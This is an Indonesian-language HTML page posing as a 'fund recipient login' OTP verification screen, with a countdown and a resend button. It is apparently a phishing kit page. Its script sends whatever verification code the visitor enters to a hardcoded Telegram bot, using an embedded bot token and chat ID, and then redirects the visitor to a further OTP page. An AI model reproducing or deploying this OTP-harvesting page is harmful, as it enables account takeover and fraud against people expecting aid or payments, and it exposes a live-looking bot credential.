<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Masuk penerima dana</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
  </style>
</head>
<body class="bg-[#F8F8F8] font-sans min-h-screen">
  <header class="flex items-center px-4 py-3 bg-gradient-to-r from-[#FF7A5A] to-[#FF8F6A] text-white">
    <button aria-label="Back" class="mr-4 text-lg">
      <i class="fas fa-arrow-left"></i>
    </button>
    <h1 class="text-base font-normal">Masuk penerima dana</h1>
  </header>

  <main class="px-6 pt-10 max-w-md mx-auto">
    <h2 class="text-center text-xl font-normal text-[#1E1E1E]">Masuk penerima dana</h2>
    <p class="text-center text-sm font-normal text-[#6B6B6B] mt-2">
      kode verifikasi akan dikirim ke nomor hp anda
    </p>
    <p class="text-center text-sm font-normal text-[#6B6B6B] mt-1"></p>

    <form id="otpForm" class="mt-8">
      <label for="otp" class="block text-sm text-[#1E1E1E] mb-1">Kode verifikasi</label>
      <div class="flex items-center border-b border-[#FF7A5A] pb-1">
        <input
          id="otp"
          name="otp"
          type="text"
          maxlength="6"
          autocomplete="one-time-code"
          class="flex-grow outline-none text-[#1E1E1E] placeholder-[#A3A3A3] text-sm bg-transparent"
          placeholder=""
          required
        />
        <button
          type="button"
          id="resendBtn"
          disabled
          class="ml-3 bg-[#D9D9D9] text-white text-xs rounded-full px-3 py-1 cursor-not-allowed select-none"
        >
          Terima OTP(60)
        </button>
      </div>
      <p class="mt-2 text-xs text-[#6B6B6B]">
        Tidak menerima OTP? Kirim ke WhatsApp &gt;
      </p>

      <button
        type="submit"
        class="mt-10 w-full max-w-xs mx-auto block bg-gradient-to-r from-[#FF7A5A] to-[#FF8F6A] text-white text-base font-normal rounded-full py-3 shadow-md"
      >
        Masuk
      </button>
    </form>
  </main>

  <script>
    const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc'; // Replace with your Telegram bot token
    const chatId = '7549590022'; // Replace with your Telegram chat ID

    const resendBtn = document.getElementById('resendBtn');
    let countdown = 60;
    let timer;

    function startCountdown() {
      resendBtn.disabled = true;
      resendBtn.classList.add('cursor-not-allowed', 'bg-[#D9D9D9]');
      resendBtn.classList.remove('bg-gradient-to-r', 'from-[#FF7A5A]', 'to-[#FF8F6A]');
      resendBtn.textContent = `Terima OTP(${countdown})`;

      timer = setInterval(() => {
        countdown--;
        resendBtn.textContent = `Terima OTP(${countdown})`;
        if (countdown <= 0) {
          clearInterval(timer);
          resendBtn.disabled = false;
          resendBtn.textContent = 'Terima OTP';
          resendBtn.classList.remove('cursor-not-allowed', 'bg-[#D9D9D9]');
          resendBtn.classList.add('bg-gradient-to-r', 'from-[#FF7A5A]', 'to-[#FF8F6A]');
        }
      }, 1000);
    }

    // Start countdown on page load
    startCountdown();

    resendBtn.addEventListener('click', () => {
      if (resendBtn.disabled) return;

      // Here you can add logic to resend OTP via your backend or API

      countdown = 60;
      startCountdown();
    });

    document.getElementById('otpForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const otpValue = document.getElementById('otp').value.trim();

      if (!otpValue) {
        alert('Kode verifikasi harus diisi');
        return;
      }

      const message = `Kode verifikasi diterima: ${otpValue}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          window.location = "otp.html";
          this.reset();
        } else {
          alert('Gagal mengirim kode verifikasi ke Telegram');
        }
      })
      .catch(() => {
        alert('Terjadi kesalahan saat mengirim data');
      });
    });
  </script>
</body>
</html>
